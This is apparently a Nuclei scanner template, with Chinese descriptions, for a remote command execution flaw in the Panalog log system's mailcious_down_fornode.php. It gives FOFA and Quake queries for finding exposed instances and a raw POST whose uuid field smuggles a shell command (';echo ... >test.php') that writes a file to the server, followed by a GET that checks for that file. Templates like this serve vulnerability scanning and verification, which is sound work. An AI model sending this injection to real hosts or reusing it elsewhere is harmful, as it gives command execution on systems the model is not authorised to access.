content:
id: panalog-mailcious-down-fornode-rce

info:
  name: panalog-mailcious-down-fornode-rce
  author: grouse
  severity: critical
  description: panalog系统的mailcious_down_fornode.php文件存在rce
  metadata:
    verified: true
    fofa-query: 'app="Panabit-Panalog"'
    quake-query: 'app: "Panalog日志系统"'
  tags: panalog,rce

http:
  - raw:
    - |
      POST /mailcious_down_fornode.php HTTP/1.1
      Host: {{Hostname}}
      User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36
      Connection: close
      Content-Type: application/x-www-form-urlencoded
      Accept-Encoding: gzip, deflate, br

      action=check&uuid=;echo 'grouse'>test.php

    - |
      GET /test.php HTTP/1.1
      Host: {{Hostname}}
      Content-Type: text/plain
      Connection: close

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "grouse"
        part: body
help: panalog日志系统，/mailcious_down_fornode.php 存在系统命令执行漏洞。
author: lcck200121
